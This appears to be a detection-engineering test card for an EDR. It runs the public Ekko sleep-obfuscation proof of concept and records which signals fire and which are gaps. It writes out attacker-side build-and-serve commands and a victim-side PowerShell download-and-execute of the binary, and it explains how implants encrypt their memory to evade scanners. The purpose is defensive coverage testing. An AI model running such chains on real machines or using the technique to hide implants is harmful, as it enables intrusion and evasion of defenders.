# Test: Evasion (very advanced) — sleep obfuscation (in-memory encryption)

**Chain:** the technique modern EDRs are architected around (Havoc Demon, CS Sleep Mask,
Ekko/Foliage variants, per the research guide): the implant **encrypts its own memory
during every sleep callback** and decrypts only to execute. Any scanner that reads memory
at the wrong moment sees ciphertext; the implant's bytes never exist at rest.

**Tooling:** public benign demos exist — the canonical PoC is
[C5pider/Ekko](https://github.com/C5pider/Ekko) (the technique Havoc ships, by Havoc's
author): a demo binary that creates its own thread, encrypts its image with the
`ROP-chain-via-timer` trick while sleeping, and prints proof. Build it on the attacker
box (`cargo build --release` — it's Rust) or from the Havoc tree.

**Manual steps (attacker build → victim run):**

```bash
# attacker box:
git clone https://github.com/C5pider/Ekko && cd Ekko
cargo build --release
cp target/release/ekko.exe ~/sideload-lab/ && cd ~/sideload-lab && python3 -m http.server 8000
```

```powershell
# victim:
Invoke-WebRequest http://172.16.69.109:8000/ekko.exe -OutFile C:\Users\Public\ekko.exe
& C:\Users\Public\ekko.exe        # benign: sleeps, encrypts its memory, wakes, repeats
# observation point - dump its memory while it sleeps:
$proc = Get-Process ekko
# (procdump/procdump64 or .NET dump) - the dump of a sleeping ekko is ciphertext
```

**Expected vs gap:**

| Signal | Today |
|---|---|
| `ekko.exe` dropped + launched | ✅ the standard chain — `SIG-*` on write (Ekko is Rust; hits the Rust heuristic at minimum), `EVT-4688-TEMP`, `PROG-IMPLANT-LAUNCH` |
| Memory-encrypted sleep state | ❌ GAP — you have no memory scanning at all; nothing distinguishes a sleeping obfuscated implant from any other process |
| Sleep-mask *mechanics* (timer callbacks, ROP) | ❌ GAP — detecting the primitive needs ETW thread/timer analysis or hook telemetry; documented in the research guide §3.1 |

**The honest verdict:** today you catch the *container* (file + launch) but not the
*technique*. That's acceptable against imix (no sleep obfuscation) and insufficient
against Havoc/CS. Closing it = the sleep/wake-transition scanning design in the research
guide (§4 checklist item 3) — the single biggest remaining sensor investment. The good
news this test proves: the launch chain fires *before* the first sleep ever happens.

**Cleanup:** `Stop-Process -Name ekko`; delete the binary.
